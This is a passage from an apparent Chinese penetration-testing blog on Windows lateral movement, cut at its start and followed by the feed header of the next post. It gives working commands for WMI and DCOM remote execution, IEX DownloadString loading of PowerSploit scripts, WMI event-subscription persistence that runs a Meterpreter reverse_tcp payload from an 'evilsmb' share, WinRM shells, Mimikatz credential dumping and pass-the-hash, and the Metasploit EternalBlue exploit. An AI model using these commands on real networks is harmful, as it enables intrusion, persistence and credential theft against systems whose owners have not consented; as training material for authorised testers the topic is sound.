windows/x64/meterpreter/reverse_tcp LHOST=192.168.2.143 LPORT=4444 -f ms -o reverse tcp.msi<br></code></pre></td></tr></table></figure></li><li><p>在一台测试人员可控的服务器上搭建 SMB 共享服务器，并将生成的 MSI文件放入共享目录。</p></li><li><p>在跳板机上执行以下命令：</p><p>控制远程主机，通过UNC路径进行远程加载测试人员服务器的 MSI 文件并进行安装，成功获取远程主机的权限.</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic /node:10.10,10.19 /user:Administrator /password:Admin@123 product call install<br>PackageLocation=&quot;\\192.168.2.143\evilsmb\reverse_tcp.msi&quot;<br></code></pre></td></tr></table></figure></li></ol><h2 id="常见利用工具"><a href="#常见利用工具" class="headerlink" title="常见利用工具"></a>常见利用工具</h2><p><strong>Wmiexec</strong></p><p>Impacket 项目的 wmiexec.py能够以全交互或半交互的方式，通过 WMI 在远程主机上执行命令。注意，该工具需要远程主机开启 135 和 445 端口，其中 445 端口用于传输命令执行的回显。</p><p>执行下面命令，获取远程主机的交互式命令行：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python wmiexec.py HACK-MY/Administrator:Admin\@123@10.10.10.19<br><span class="hljs-meta prompt_"># </span><span class="language-bash">python wmiexec.py &lt;Domian&gt;/&lt;Username&gt;:&lt;Password&gt;@&lt;IP&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240415090722425.png" alt="image-20240415090722425"></p><p>Windows平台可以使用PyInstaller，将wmiexec.py打包成独立的可执行文件exe，打包完成后可以直接上传到Windows主机中运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">pip3 install pyinstaller<br>cd impacket\examples<br>pyinstaller -F wmiexec.py<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240415091103406.png" alt="image-20240415091103406"></p><p><strong>Invoke-WmiCommand</strong></p><p>Invoke-WmiCommand.ps1是PowerSploit 项目中的一个脚本，可以通过 PowerShell调用WMI来远程执行命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">远程加载Invoke—WmiCommand.ps1脚本</span><br>IEX(New-Object Net.Webclient).DownloadString(&#x27;http://IP:Port/Invoke-WmiCommand.ps1&#x27;)<br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定远程系统用户名</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">User = <span class="hljs-string">&quot;HACK-MY\Administrator&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定用户的密码</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Password = ConvertTo-SecureString -String <span class="hljs-string">&quot;Admin@123&quot;</span> -AsPlainText -Force</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">将用户名和密码整合，以便导入Credential</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Cred = New-Object-TypeName System.Mangement.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定远程主机的IP和要执行的命令</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Remote = Invoke-WmiCommand -Payload (ipconfig) -Credential <span class="hljs-variable">$Cred</span> -ComputerName <span class="hljs-string">&quot;10.10.10.19&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">输出命令执行回显</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Remote.PayloadOutput</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240415092051471.png" alt="image-20240415092051471"></p><p>此外，PowerShell内置的Invoke-WMIMethod也可以在远程系统中执行命令或程序。</p><h2 id="WMI事件订阅的利用"><a href="#WMI事件订阅的利用" class="headerlink" title="WMI事件订阅的利用"></a>WMI事件订阅的利用</h2><p>WMI提供了强大的事件处理系统，几乎可以用于对操作系统上发生的任何事件做出响应。例如，当创建某进程时，通过WMI事件订阅来执行预先设置的脚本。其中，触发事件的具体条件被称为“事件过滤器”(Event Filter)，如用户登录、新进程创建等;对指定事件发生做出的响应被称为“事件消费者”(Event Consumer)，包括一系列具体的操作，如运行脚本、记录日志、发送邮件等。在部署事件订阅时，需要分别构建 Filter和 Consumer 两部分，并将二者绑定在一起。</p><p>所有的事件过滤器都被存储为一个 ROOT\subscription:__EventFilter 对象的实例，可以通过创建EventFilter 对象实例来部署事件过滤器。事件消费者是基于 ROOTsubscription:__EventConsumer 系统类派生来的类。系统提供了常用的标准事件消费类。</p><table><thead><tr><th>事件消费类</th><th>说明</th></tr></thead><tbody><tr><td>LogFileEventConsumer</td><td>将事件数据写入指定的日志文件</td></tr><tr><td>ActiveScriptEventConsumer</td><td>执行嵌入的VBScript或JavaScript脚本</td></tr><tr><td>NTEventLogEventConsumer</td><td>创建一个包含事件数据的事件日志条目</td></tr><tr><td>SMTPEventConsumer</td><td>发送一封包含事件数据的电子邮件</td></tr><tr><td>CommandLineEventConsumer</td><td>执行指定的系统命令</td></tr></tbody></table><p>测试人员可以利用WMI在远程主机部署永久的事件订阅，在特定事件发生时执行任意代码或者命令。该技术主要用来在目标系统完成权限持久化，亦可用于横向移动，并且需要提供远程主机的管理员权限的用户凭据。</p><p><strong>手动利用</strong></p><p>通过手动执行PowerShell命令来进行利用</p><ol><li><p>整合PSCredential，用于后续过程的认证</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">Username =<span class="hljs-string">&quot;HACK-MY\Administrator&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Password =<span class="hljs-string">&quot;Admin@123&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">SecurePassword = <span class="hljs-variable">$Password</span> | ConvertTo-SecureString -AsPlainText -Force</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Credential = New-0bject -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$Username</span>,<span class="hljs-variable">$SecurePassword</span></span><br></code></pre></td></tr></table></figure></li><li><p>设置攻击目标和其他公共参数</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">GlobalArgs = @&#123;&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">SComputerName = <span class="hljs-string">&quot;10.10.10.19&quot;</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">GlobalArgs[<span class="hljs-string">&#x27;Credential&#x27;</span>] = <span class="hljs-variable">$Credential</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">GlobalArgs[<span class="hljs-string">&#x27;ComputerName&#x27;</span>]=<span class="hljs-variable">$ComputerName</span></span><br></code></pre></td></tr></table></figure></li><li><p>在远程主机部署”TestFilter”事件过滤器，用于查询svchost.exe进程的产生。通过Set-WmiInstance Cmdlet创建一个__EventFilter类的实例即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">EventFilterArgs = @&#123;</span><br>    EventNamespace =&quot;root/cimv2<br>    Name =&quot;TestFiltern<br>    Query = &quot;SELECT * FROM Win32_ProcessStartTrace where processname =&#x27;svchost.exe&#x27;&quot;<br>    QueryLanguage =&#x27;WQL&#x27;<br>&#125;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments <span class="hljs-variable">$EventFilterArgs</span> @GlobalArgs</span><br></code></pre></td></tr></table></figure></li><li><p>在远程主机上部署一个名为”TestConsumer”的事件消费者</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">CommandLineEventConsumerArgs = @&#123;</span><br>    Name = &quot;TestConsumer&quot;<br>    CommandLineTemplate = &quot;C:\Windows\System32\cmd.exe /c calc.exe&quot;<br>&#125;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">EventConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments <span class="hljs-variable">$CommandLineEventConsumerArgs</span> @GlobalArgs</span><br></code></pre></td></tr></table></figure></li><li><p>将创建的事件过滤器和时间消费者绑定在一起</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">FilterConsumerBindingArgs = @&#123;</span><br>    Filter = $EventFilter<br>    Consumer = $EventConsumer<br>&#125;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments <span class="hljs-variable">$FilterConsumerBindingArgs</span> @GlobalArgs</span><br></code></pre></td></tr></table></figure></li></ol><p>到此，已经成功在远程主机(10.10.10.19)上部署了一个事件订阅，当远程系统轮询到 svchost.exe进程产生时，将通过事件消费者执行系统命令来启动calc.exe进程。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240415094422693.png" alt="image-20240415094422693"></p><p><strong>Sharp-WMIEvent</strong></p><p>上面的利用过程可以整合为一个powershell脚本。不过相关脚本项目网上好像没了。</p><ol><li><p>在可控的服务器上搭建SMB共享服务器，并将生成的攻击载荷放入共享目录</p></li><li><p>在跳板机上执行下面命令，运行该脚本：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -ComputerName 10.10.10.19 -Domain hack-my.com -Username Administrator -Password Admin@123 -Command &quot;cmd.exe /c \\10.10.10.147\evilsmb\reverse_tcp.exe&quot;<br></code></pre></td></tr></table></figure></li></ol><p>然后就将在远程主机上部署一个随机命名的永久事件订阅，并隔60秒会执行一次SMB共享中的攻击载荷，上线远程主机</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240415165851113.png" alt="image-20240415165851113"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240415165904903.png" alt="image-20240415165904903"></p><h1 id="DCOM的利用"><a href="#DCOM的利用" class="headerlink" title="DCOM的利用"></a>DCOM的利用</h1><h2 id="COM和DCOM"><a href="#COM和DCOM" class="headerlink" title="COM和DCOM"></a>COM和DCOM</h2><p><strong>COM</strong></p><p>COM(Component Object Model，组件对象模型)是微软的一套软件组件的二进制接口标准，使得跨编程语言的进程间通信、动态对象创建成为可能。COM是多项微软技术与框架的基础，包括 OLE、OLE自动化、ActiveX、COM+、DCOM、Windows Shell、DirectX、Windows Runtime。</p><p>COM 由一组构造规范和组件对象库组成。COM组件对象通过接口来描述自身，组件提供的所有服务都通过其接口公开。接口被定义为“在对象上实现的一组语义上相关的功能”，实质是一组函数指针表。每个指针必须初始化指向某个具体的函数体，一个组件对象实现的接口数量没有限制。COM指定了一个对象模型和编程要求，使COM对象能够与其他对象交互。这些对象可以在单个进程中，也可以在其他进程中，甚至可以在远程计算机上。</p><p>在 Windows中，每个COM 对象都由唯一的128 位的二进制标识符标识，即 GUID当 GUID用于标识 COM 对象时，被称为CLSID(类标识符)；当它用于标识接口时，被称为IID(接口标识符)。一些CLSID还具有ProgID，方便人们记忆。</p><p><strong>DCOM</strong></p><p>DCOM(Distributed Component Object Model，分布式组件对象模型)是微软基于组件对象模型(COM)的一系列概念和程序接口，支持不同机器上的组件间的通信。利用DCOM，客户端程序对象能够请求来自网络中另一台计算机上的服务器程序对象。</p><p>DCOM是COM的扩展,允许应用程序实例化和访问远程计算机上的COM对象的属性和方法。DCOM使用远程过程调用(RPC)技术将组件对象模型(COM)的功能扩展到本地计算机之外,因此,在远程系统上托管COM服务器端的软件(通常在 DLL 或EXE中)可以通过RPC向客户端公开其方法。</p><h2 id="通过DCOM横向移动"><a href="#通过DCOM横向移动" class="headerlink" title="通过DCOM横向移动"></a>通过DCOM横向移动</h2><p>部分DCOM组件中公开的接口中可能包含不安全的方法。</p><p>执行下面命令可以查看所有DCOM程序组件：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Get-CimInstance Win32_DCOMApplication<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240415235944954.png" alt="image-20240415235944954"></p><p>测试人员可以枚举包含不安全方法的DCOM对象，并于远程计算机的DCOM对象进行交互，从而实现远程执行。不过需要满足下面的条件：拥有管理员权限的PowerShell；远程主机未开启防火墙。</p><p>目前常用的组件有：MMC20.Application、ShellWindows、Excel.Application、ShellBrowserWindow等。</p><p><strong>MMC20.Application</strong></p><p>MMC20.Application对象的Document.ActiveView下存在一个ExecuteShellCommand方法，可以用来启动子进程并运行执行的程序或系统命令</p><p>下面利用该组件上线Meterpreter</p><ol><li><p>在一台服务器搭建SMB匿名共享服务，将攻击载荷放在共享目录下面</p></li><li><p>在管理员权限的PowerShell执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">通过 ProgID 与 DCOM 进行远程交互，并创建 MMC20.Application 对象的实例</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com = [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;10.10.10.19&quot;</span>))</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">调用ExecuteShellCommand方法启动进程，以运行攻击载荷</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com.Document.ActiveView.ExecuteShellCommand(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c \\192.168.2.143\evilsmb\reverse_tcp.exe&quot;</span>,<span class="hljs-string">&quot;Minimized&quot;</span>)</span><br></code></pre></td></tr></table></figure></li></ol><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416002841235.png" alt="image-20240416002841235"></p><p>在调用过程中,MMC20.Application会启动mmc.exe进程,通过ExecuteShellCommand方法在 mmc.exe 中创建子进程，适用于 Windows7及以上版本的系统,</p><p><strong>ShellWindows</strong></p><p>ShellWindows 组件提供了 Document.Application.ShellExecute 方法，可以启动子进程来运行指定的程序或系统命令，适用于Windows7及以上版本的系统。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416003019343.png" alt="image-20240416003019343"></p><p>因为该对象没有ProgID，所以需要CLSID来创建实例。</p><p>可以用下面命令来查找：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Get-CimInstance Win32_DCOMApplication | findstr ShellWindows<br></code></pre></td></tr></table></figure><p>还可以通过OleViewDotNet来查找，OleViewDotNet 是一个独立的工具，需要安装并在 Windows 操作系统上运行。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416003638763.png" alt="image-20240416003638763"></p><p>跟上面的利用方法类似，在管理员权限PowerShell下执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">通过CLSID与DCOM进行远程交互，并创建ShellWindows对象实例</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com = [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromCLSID(<span class="hljs-string">&quot;9BA05972-F6A8-11CF-A442-00A0C90A8F39&quot;</span>,<span class="hljs-string">&quot;10.10.10.19&quot;</span>))</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">调用ShellExecute方法启动子进程</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com.item().Document.Application.ShellExecute(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;C:\Windows\System32&quot;</span>,<span class="hljs-variable">$null</span>,0)</span><br></code></pre></td></tr></table></figure><p>注意，ShellWindows并不会创建新进程，而是在已有 explorer.exe进程中创建并执行子进程。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416004155840.png" alt="image-20240416004155840"></p><p><strong>ShellBrowserWindow</strong></p><p>ShellBrowserWindow中也存在一个Document.Application.ShellExecute方法，与ShellWindows 一样，但不会创建新进程，而是通过已有的 explorer.exe 来托管子进程。该方法只适用于 Windows 10和 Windows Server 2012等版本的系统</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">通过CLSID与DCOM进行远程交互，并创建ShellBrowserWindow对象实例</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com = [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromCLSID(<span class="hljs-string">&quot;c08afd90-f2a1-11d1-8455-00a0c91f3880&quot;</span>,<span class="hljs-string">&quot;10.10.10.19&quot;</span>))</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">调用ShellExecute方法启动子进程</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com.item().Document.Application.ShellExecute(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;C:\Windows\System32&quot;</span>,<span class="hljs-variable">$null</span>,0)</span><br></code></pre></td></tr></table></figure><h1 id="WinRM的利用"><a href="#WinRM的利用" class="headerlink" title="WinRM的利用"></a>WinRM的利用</h1><p>WinRM 是通过执行 WS-Management 协议(用于远程软件和硬件管理的 Web 服务协议)来实现远程管理的，允许处于一个共同网络内的 Windows 计算机彼此之间互相访问和交换信息，对应的端口是 5985。在一台计算机启用 WinRM 服务后，防火墙会自动放行其相关通信端口，另一台计算机便能通过 WinRM 对其进行远程管理了。</p><p>注意，只有在Windows Server 2008以上版本的服务器中WinRM 服务才会自动居动。测试人员通过 WinRM 服务进行横向移动时，需要拥有远程主机的管理员凭据信息。</p><h2 id="通过WinRM执行远程命令"><a href="#通过WinRM执行远程命令" class="headerlink" title="通过WinRM执行远程命令"></a>通过WinRM执行远程命令</h2><p><strong>Winrs</strong></p><p>Winrs是一个客户端程序，通过用户凭据在运行WinRM的服务器上执行系统命令，双方都需要安装WinRM。</p><p>执行下面命令在远程主机执行上执行命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">winrs -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123 &quot;whoami&quot;<br></code></pre></td></tr></table></figure><p>还可以获得交互式命令行</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">winrs -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123 &quot;cmd&quot;<br></code></pre></td></tr></table></figure><p><strong>Winrm.cmd</strong></p><p>Winrm.cmd 允许 WMI对象通过 WinRM 传输进行远程交互，在本地或远程计算机上枚举 WMI 对象实例或调用 WMI 类方法。例如，通过调用 Win32_Process 类中的 Create方法来创建远程进程。</p><p>实战中可以远程执行一个攻击载荷，这里尝试启动一个notepad.exe进程：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">winrm invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck @&#123;commandline=&quot;notepad.exe&quot;&#125; -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123<br></code></pre></td></tr></table></figure><p>查看远程主机的进程，可以看到正在运行</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416005418907.png" alt="image-20240416005418907"></p><h2 id="通过WinRm获取交互式会话"><a href="#通过WinRm获取交互式会话" class="headerlink" title="通过WinRm获取交互式会话"></a>通过WinRm获取交互式会话</h2><p><strong>PowerShell下的利用</strong></p><p>PowerShell 的远程传输协议基于WinRM规范，同时提供了强大的远程管理功能。</p><p>Enter-PSSession的PowerShellCmdlet可以启动与远程主机的会话。在会话交互期间用户输入的命令在远程计算机上运行，就像直接在远程计算机上输入一样。</p><ol><li><p>跳板机上执行以下命令启动一个与远程主机的交互式会话，其名称为WinRM1</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">指定远程系统用户名</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">User = <span class="hljs-string">&quot;HACK-MY\Administrator&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定用户的密码</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Password = ConvertTo-SecureString -String <span class="hljs-string">&quot;Admin@123&quot;</span> -AsPlainText -Force</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">将用户名和密码整合，以便导入Credential</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Cred = New-0bject -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">根据提供的凭据创建会话</span><br>New-PSSession -Name WinRM1 -ComputerName 10.10.10.19 -Credential $cred -Port 5985<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416092847951.png" alt="image-20240416092847951"></p></li><li><p>执行<strong>Get-PSSession</strong>查看当前已创建的PSSession会话</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416093011945.png" alt="image-20240416093011945"></p></li><li><p>执行下面命令，选中任意一个会话，进入交互模式</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Enter-PSSession -Name WinRM1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416093130574.png" alt="image-20240416093130574"></p></li><li><p>也可以通过Invoke-Command在指定的会话中执行下面命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">指定远程系统用户名</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">User =<span class="hljs-string">&quot;HACK-MY\Administrator&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">指定用户的密码</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Password =ConvertTo-SecureString -String <span class="hljs-string">&quot;Admin@123&quot;</span> -AsPlainText -Force</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">将用户名和密码整合，以便导入Credential</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Cred = New-0bject -TypeName System.Management.Automation.PsCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">根据提供的凭据创建会话</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Sess=New-PSSession -Name WinRMl -ComputerName 10,10,10.19 -Credential <span class="hljs-variable">$Cred</span> -Port 5985</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">在创建的会话中执行命令</span><br>Invoke-Command -Session $Sess -ScriptBlock&#123;dir c:\&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416093424298.png" alt="image-20240416093424298"></p></li></ol><p><strong>Evil-Winrm</strong></p><p>Evil-Winrm 是基于 WinRM Shell 的渗透框架，可通过提供的用户名密码或用户哈希值在启用了 WinRM 服务的目标主机上完成简单的攻击任务。</p><h1 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h1><p>哈希传递(Pass The Hash，PTH)是一种针对NTLM协议的攻击技术。在NTLM 身份认证的第三步中生成Response 时，客户端直接使用用户的NTLM 哈希值进行计算，用户的明文密码并不参与整个认证过程。也就是说，在Windows 系统中只使用用户哈希值对访问资源的用户进行身份认证。</p><p>因此当获得有效的用户名和哈希之后，就能够利用该信息对远程主机进行身份验证。</p><h2 id="哈希传递攻击的利用"><a href="#哈希传递攻击的利用" class="headerlink" title="哈希传递攻击的利用"></a>哈希传递攻击的利用</h2><p>下面用Mimikatz和Impacket进行哈希传递工具，相关工具还有很多，如CrackMapExec、PowerShell、Evil-Winrm等，Metasploit框架下也内置了很多可以执行哈希传递攻击的模块。</p><p><strong>Mimikatz利用</strong></p><p>MImikatz内置了哈希传递功能，需要管理员权限。</p><ol><li><p>Mimikatz上传到跳板机后执行下面命令抓取域管理员哈希</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416094725309.png" alt="image-20240416094725309"></p></li><li><p>利用抓取到的NTLM Hash进行哈希传递攻击</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:hack-my.com /ntlm:570a9a65db8fba761c1008a51d4c95ab&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/user，指定要传递的用户名;/domain，指定当前所处域名或工作组名;/ntlm，指定用户哈希</span><br></code></pre></td></tr></table></figure><p>弹出一个新的命令行窗口，在新的命令行中具有域管理员权限，可以访问域控的CIFS服务。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416094714274.png" alt="image-20240416094714274"></p></li></ol><p><strong>利用Impacket进行PTH</strong></p><p>该项目中具有远程执行功能的几个脚本几乎都可以进行哈希传递攻击，常见的有psexec.py、smbexec.py和wmiexec.py。使用时可以配合内网代理技术进行攻击。</p><p>例如smbexec.py：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python smbexec.py -hashes :570a9a65db8fba761c1008a51d4c95ab hack-my.com/administrator@10.10.10.19<br><span class="hljs-meta prompt_"># </span><span class="language-bash">python smbexec.py -hashes LM Hash:NLTM Hash domain/username@ip</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-hashes，指定用户完整的哈希值，如果 LM Hash被废弃，就将其指定为0或为空</span><br></code></pre></td></tr></table></figure><h2 id="利用哈希传递登录远程桌面"><a href="#利用哈希传递登录远程桌面" class="headerlink" title="利用哈希传递登录远程桌面"></a>利用哈希传递登录远程桌面</h2><p>利用条件：</p><ol><li>远程主机开启了”受限管理员模式”</li><li>用于远程登陆的用户位于远程主机的管理员组中</li><li>目标用户的哈希</li></ol><p>Windows Server 2012 R2及以上版本的 Windows 系统采用了新版的RDP，支持受限管理员模式(Restricted Admin Mode)。开启该模式后，测试人员可以通过哈希传递直接登录远程桌面，不需输入明文密码。受限管理员模式在 Windows 8.1和 Windows Server2012R2上默认开启，在其他主机中可以通过执行以下命令手动开启。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKLM\System\CurrentControlset\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f<br></code></pre></td></tr></table></figure><ol><li><p>查看主机是否开启”受限管理员模式”，为0则开启，否则未开启</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg query &quot;HKLM\System\CurrentControlset\Control\Lsa&quot; /v DisableRestrictedAdmin<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416180945907.png" alt="image-20240416180945907"></p></li><li><p>若开启，则通过Mimikatz进行利用</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">privilege::debug<br>sekurlsa::pth /user:Administrator /domain:hack-my.com /ntlm:570a9a65db8fba761c1008a51d4c95ab &quot;/run:mstsc.exe /restrictedadmin&quot;<br></code></pre></td></tr></table></figure><p>大致原理是，哈希传递成功后执行“mstsc.exe &#x2F;restrictedadmin”命令，以受限管理员模式运行远程桌面客户端，此时不需输入用户名密码即可成功登录远程桌面</p></li></ol><h1 id="EternalBlue"><a href="#EternalBlue" class="headerlink" title="EternalBlue"></a>EternalBlue</h1><p>即大名鼎鼎的永恒之蓝漏洞。</p><p>Metasploit 渗透框架内置了 EternalBlue 漏洞的检测和利用模块。下面通过 Windows’环境进行漏洞利用。</p><ol><li><p>通过auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010模块扫描目标主机是否存在漏洞</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">use auxiliary/scanner/smb/smb_ms17_010<br>set rhosts 10.10.10.14  # 设置目标主机的IP，也可以设置整个IP段<br>set threads 10<br>exploit<br></code></pre></td></tr></table></figure></li><li><p>通过exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue模块进行漏洞利用</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">use exploit/windows/smb/ms17_010_eternalblue<br>set rhosts 10.10.10.14<br>ser payload windows/x64/meterpreter/reverse_tcp<br>set lhost 10.10.10.147<br>set lport 4444<br>exploit<br></code></pre></td></tr></table></figure></li></ol><p>Metasploit中还有很多远程代码执行漏洞相关的漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSSQL学习</title>
      <link href="/2024/04/03/MSSQL%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/03/MSSQL%E5%AD%A6%E4%B9%A0/</url>
      
